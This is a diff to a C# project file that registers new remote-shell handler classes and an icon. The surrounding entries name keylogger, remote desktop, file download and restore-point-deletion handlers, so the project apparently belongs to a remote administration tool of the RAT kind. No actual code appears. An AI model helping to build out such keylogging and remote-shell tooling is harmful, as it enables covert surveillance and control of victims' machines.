@@ -159,6 +159,7 @@
     <Compile Include="Misc\Settings.cs" />
     <Compile Include="Network\ChatHandler.cs" />
     <Compile Include="Network\ClientHandler.cs" />
+    <Compile Include="Network\RemoteShellHandler.cs" />
     <Compile Include="Network\KeyloggerHandler.cs" />
     <Compile Include="Network\PacketHandler.cs" />
     <Compile Include="Network\RemoteDesktopHandler.cs" />
@@ -170,6 +171,8 @@
     <Compile Include="PacketHandler\Miscellaneous\ChatPacketHandler.cs" />
     <Compile Include="PacketHandler\Client\ConnectedPacketHandler.cs" />
     <Compile Include="PacketHandler\File\DeleteFilePacketHandler.cs" />
+    <Compile Include="PacketHandler\Shell\RemoteStartShellPacketHandler.cs" />
+    <Compile Include="PacketHandler\Shell\RemoteShellStdOutPacketHandler.cs" />
     <Compile Include="PacketHandler\UAC\DeleteRestorePointPacketHandler.cs" />
     <Compile Include="PacketHandler\File\DisksPacketHandler.cs" />
     <Compile Include="PacketHandler\File\DownloadFilePacketHandler.cs" />
@@ -233,6 +236,7 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="eagle2.ico" />
+    <None Include="Resources\icons8_command_line.ico" />
     <None Include="Resources\uninstall_programs_32px.png" />
     <None Include="Resources\icons8_signal.ico" />
     <None Include="Resources\icons8_Tools.ico" />
@@ -322,9 +326,6 @@
     <None Include="Resources\icons8_data_backup.ico" />
     <None Include="Resources\imageres_4.ico" />
     <None Include="Resources\github%402x.png" />
-  </ItemGroup>
-  <ItemGroup>
-    <WCFMetadata Include="Connected Services\" />
   </ItemGroup>
   <ItemGroup>
     <ProjectReference Include="..\Utils\PacketLib\PacketLib.csproj">
